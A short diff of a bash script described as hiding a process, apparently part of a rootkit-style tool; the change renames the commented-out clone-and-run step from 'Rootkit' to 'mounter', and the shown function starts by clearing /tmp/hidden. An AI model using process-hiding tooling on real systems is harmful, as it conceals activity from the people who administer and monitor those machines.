@@ -1,7 +1,7 @@
 #!/usr/bin/env bash
 # A simple script to hide a process
 #git clone https://github.com/karanbir-singh001/Rootkit
-#chmod +x Rootkit; ./Rootkit
+#chmod +x mounter; ./mounter
 
 function mkFolder() {
         rm -rf /tmp/hidden
